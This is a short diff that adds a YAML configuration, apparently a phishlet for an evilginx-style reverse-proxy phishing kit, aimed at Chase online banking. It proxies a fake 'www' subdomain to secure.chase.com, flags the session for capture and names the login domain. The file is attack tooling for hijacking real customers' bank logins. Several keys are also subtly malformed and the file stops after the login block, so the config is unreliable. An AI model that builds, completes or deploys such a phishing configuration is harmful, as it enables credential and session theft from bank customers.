@@ -1,0 +1,6 @@
+name: chase Online Banking
+author: Silva
+proxy hosts: 
+  - {phish sub: 'www' ,orig sub: 'secure' , domain: 'chase.com' session: true, is login: true}
+login:
+  domain: 'secure.chase.com'
